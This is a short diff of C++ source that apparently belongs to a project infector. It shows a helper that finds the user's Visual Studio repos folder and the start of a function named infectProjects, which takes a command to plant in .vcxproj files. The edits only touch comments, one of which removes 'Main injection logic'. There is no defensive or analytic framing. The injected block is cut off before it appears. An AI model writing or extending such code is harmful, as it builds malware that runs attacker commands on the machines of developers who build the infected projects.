@@ -12,7 +12,7 @@ std::wstring getCommonRepoDir() {
     wchar_t* userProfile = nullptr;
     size_t len = 0;
 
-    // Get the USERPROFILE environment variable (e.g., C:\Users\USERNAME)
+    // Get the USERPROFILE environment variable
     _wdupenv_s(&userProfile, &len, L"USERPROFILE");
 
     if (userProfile) {
@@ -23,13 +23,10 @@ std::wstring getCommonRepoDir() {
         return repoPath;
     }
 
-    // Fallback if environment variable is missing
+    // fallback if environment variable is missing
     return L"C:\\Users\\Default\\source\\repos";
 }
 
-
-
-// Main injection logic for .vcxproj files
 void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {
 
     std::wstring block =
